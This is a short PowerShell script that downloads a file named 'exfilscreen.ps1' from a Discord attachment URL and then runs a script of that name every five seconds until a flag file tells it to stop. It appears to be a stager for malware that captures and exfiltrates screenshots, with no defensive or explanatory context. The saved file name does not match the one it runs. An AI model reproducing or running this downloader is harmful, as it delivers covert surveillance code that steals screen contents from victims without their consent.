Invoke-WebRequest -UseBasicParsing -Uri https://cdn.discordapp.com/attachments/1049384614948511774/1049744206031229008/exfilscreen.ps1 -OutFile screen.ps1
while (1 -eq 1 ){
    $test = Get-Content -Path .\screens.txt
    if (1 -eq $test) {
	exit
    }
    start-sleep -seconds 5
    .\exfilscreen.ps1
    }
